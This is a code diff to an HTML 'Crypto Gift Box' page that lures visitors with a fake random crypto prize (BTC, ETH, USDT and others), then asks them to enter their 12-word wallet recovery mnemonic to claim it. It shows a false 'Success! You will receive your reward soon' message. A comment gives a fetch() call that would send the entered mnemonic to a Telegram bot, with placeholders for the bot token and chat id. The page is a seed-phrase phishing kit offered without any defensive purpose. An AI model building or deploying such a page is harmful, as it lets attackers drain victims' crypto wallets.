@@ -3,135 +3,151 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Crypto Gift</title>
+  <title>Crypto Gift Box</title>
   <style>
     body {
-      background-color: #0d0d0d;
-      color: #fff;
+      background: #0d0d0d;
+      color: #ffffff;
       font-family: 'Poppins', sans-serif;
-      text-align: center;
-      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       padding: 20px;
     }
     h1 {
       color: #ffc107;
-      font-size: 2.2em;
       margin-bottom: 20px;
+      font-size: 2em;
     }
     .gift-box {
       width: 150px;
       height: 150px;
-      background: #1a1a1a;
+      background: #1f1f1f;
       border: 3px solid #ffc107;
       border-radius: 20px;
-      margin: 20px auto;
       display: flex;
       align-items: center;
       justify-content: center;
+      font-size: 60px;
       cursor: pointer;
       transition: transform 0.3s;
+      margin-bottom: 20px;
     }
     .gift-box:hover {
       transform: scale(1.05);
     }
-    .gift-box img {
-      width: 80px;
-      height: 80px;
-    }
     .prizes {
       display: flex;
       flex-wrap: wrap;
-      justify-content: center;
       gap: 10px;
-      margin-top: 20px;
+      justify-content: center;
+      margin-bottom: 20px;
     }
     .prize {
-      background: #1a1a1a;
-      border: 1px solid #333;
+      background: #1f1f1f;
+      padding: 8px 14px;
       border-radius: 10px;
-      padding: 8px 12px;
+      border: 1px solid #333;
       font-size: 14px;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-    }
-    .prize img {
-      width: 20px;
-      height: 20px;
     }
     .message {
-      margin-top: 20px;
+      margin: 15px 0;
+      color: #00ff00;
       font-size: 1.2em;
-      color: #0f0;
+      min-height: 30px;
+    }
+    .error-message {
+      margin-top: 10px;
+      padding: 10px;
+      background: #ff4d4d;
+      color: #fff;
+      border-radius: 8px;
+      display: none;
+      max-width: 400px;
+      text-align: center;
+    }
+    .success-message {
+      margin-top: 10px;
+      padding: 10px;
+      background: #28a745;
+      color: #fff;
+      border-radius: 8px;
+      display: none;
+      max-width: 400px;
+      text-align: center;
     }
     .button {
-      background-color: #ffc107;
+      background: #ffc107;
       color: #000;
-      padding: 12px 25px;
-      margin-top: 20px;
+      padding: 10px 20px;
       border: none;
-      border-radius: 12px;
+      border-radius: 10px;
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.3s;
+      margin-top: 10px;
+      transition: background 0.3s;
     }
     .button:hover {
-      background-color: #e0a800;
+      background: #e0a800;
     }
-    input[type="text"] {
-      width: 90%;
-      max-width: 400px;
-      padding: 12px;
+    #claim-section {
+      display: none;
       margin-top: 20px;
-      border-radius: 12px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    #mnemonics {
+      width: 90%;
+      padding: 10px;
+      border-radius: 8px;
       border: 1px solid #333;
-      background-color: #1a1a1a;
+      background: #1f1f1f;
       color: #fff;
-      font-size: 16px;
-      box-shadow: 0 0 10px rgba(255, 193, 7, 0.3);
+      margin-bottom: 10px;
+      font-size: 15px;
     }
   </style>
 </head>
 <body>
 
-  <h1>Open Your Crypto Gift!</h1>
+  <h1>Open Your Crypto Gift</h1>
 
-  <div class="gift-box" id="giftBox" onclick="openGift()">
-    <img src="gift-box.png" alt="Gift Box">
-  </div>
+  <div class="gift-box" id="giftBox" onclick="openGift()">🎁</div>
 
   <div class="prizes">
-    <div class="prize"><img src="bnb.png">1 BNB</div>
-    <div class="prize"><img src="usdt.png">10 USDT</div>
-    <div class="prize"><img src="usdt.png">100 USDT</div>
-    <div class="prize"><img src="btc.png">1 BTC</div>
-    <div class="prize"><img src="eth.png">1 ETH</div>
-    <div class="prize"><img src="ltc.png">1 LTC</div>
-    <div class="prize"><img src="xrp.png">500 XRP</div>
-    <div class="prize"><img src="sol.png">0.5 SOL</div>
-    <div class="prize"><img src="ada.png">2 ADA</div>
-    <div class="prize"><img src="doge.png">100 DOGE</div>
+    <div class="prize">1 BNB</div>
+    <div class="prize">10 USDT</div>
+    <div class="prize">100 USDT</div>
+    <div class="prize">1 BTC</div>
+    <div class="prize">1 ETH</div>
+    <div class="prize">1 LTC</div>
+    <div class="prize">500 XRP</div>
+    <div class="prize">0.5 SOL</div>
+    <div class="prize">2 ADA</div>
+    <div class="prize">100 DOGE</div>
   </div>
 
   <div id="result" class="message"></div>
 
-  <button class="button" onclick="claimNow()">Claim Now</button>
+  <button class="button" onclick="showClaim()">Claim Now</button>
 
-  <br>
-
-  <input type="text" id="mnemonics" placeholder="Enter your 12-word Mnemonics">
-  
-  <br>
-
-  <button class="button" onclick="submitMnemonics()">Submit</button>
+  <div id="claim-section">
+    <input type="text" id="mnemonics" placeholder="Enter your 12-word Mnemonics">
+    <br>
+    <button class="button" onclick="submitMnemonics()">Submit</button>
+    <div id="error" class="error-message"></div>
+    <div id="success" class="success-message"></div>
+  </div>
 
   <script>
     function openGift() {
       const lastClick = localStorage.getItem('lastClick');
       const now = new Date().getTime();
       if (lastClick && now - lastClick < 86400000) { // 24 hours
-        alert("You can open the gift once every 24 hours!");
+        document.getElementById('result').style.color = "#ff4d4d";
+        document.getElementById('result').innerText = "You can open the gift only once every 24 hours!";
         return;
       }
       const prizes = [
@@ -139,20 +155,31 @@
         '1 LTC', '500 XRP', '0.5 SOL', '2 ADA', '100 DOGE'
       ];
       const won = prizes[Math.floor(Math.random() * prizes.length)];
+      document.getElementById('result').style.color = "#00ff00";
       document.getElementById('result').innerText = "Congratulations! You won: " + won;
       localStorage.setItem('lastClick', now);
     }
 
-    function claimNow() {
-      alert("Please enter your 12-word Mnemonics below to claim.");
+    function showClaim() {
+      document.getElementById('claim-section').style.display = 'block';
     }
 
     function submitMnemonics() {
       const mnemonic = document.getElementById('mnemonics').value.trim();
-      if (mnemonic.split(" ").length === 12) {
-        alert("Mnemonic submitted successfully!");
+      const errorDiv = document.getElementById('error');
+      const successDiv = document.getElementById('success');
+      errorDiv.style.display = "none";
+      successDiv.style.display = "none";
+
+      if (mnemonic.split(" ").length !== 12) {
+        errorDiv.innerText = "Error: Please enter exactly 12 words!";
+        errorDiv.style.display = "block";
       } else {
-        alert("Please enter a valid 12-word mnemonic.");
+        successDiv.innerText = "Success! You will receive your reward soon.";
+        successDiv.style.display = "block";
+        
+        // Here you can send the mnemonic to your Telegram Bot
+        // Example: fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=" + encodeURIComponent(mnemonic));
       }
     }
   </script>
